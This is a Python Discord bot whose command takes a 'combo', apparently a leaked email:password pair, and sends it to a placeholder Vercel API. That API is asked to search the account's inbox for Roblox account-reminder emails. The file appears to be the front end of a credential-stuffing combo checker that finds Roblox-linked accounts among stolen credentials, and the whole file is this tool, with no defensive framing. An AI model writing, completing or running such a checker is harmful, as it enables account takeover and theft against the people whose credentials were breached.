import discord
from discord.ext import commands
import aiohttp
import asyncio

intents = discord.Intents.default()
intents.message_content = True

bot = commands.Bot(command_prefix='!', intents=intents)

async def check_account_from_api(combo):
    url = "https://your-vercel-project.vercel.app/api/solver/check"
    
    data = {
        "combo": combo,
        "search_params": {
            "from_email": "accounts@roblox.com",
            "subject": "Roblox Account Reminder"
        }
    }
    
    async with aiohttp.ClientSession() as session:
        async with session.post(url, json=data) as response:
            if response.status == 200:
                result = await response.json()
                return result
            else:
                return {"status": "error", "message": "Failed to check account"}

@bot.command(name='check_account')
async def check_account(ctx, combo: str):
    # Call the API to check the account
    result = await check_account_from_api(combo)
    
    # Handle result and send a response to Discord
    if result.get("status") == "success":
        await ctx.send(f"Account check successful: {result.get('message')}")
    else:
        await ctx.send(f"Account check failed: {result.get('message')}")

bot.run('YOUR_DISCORD_TOKEN')
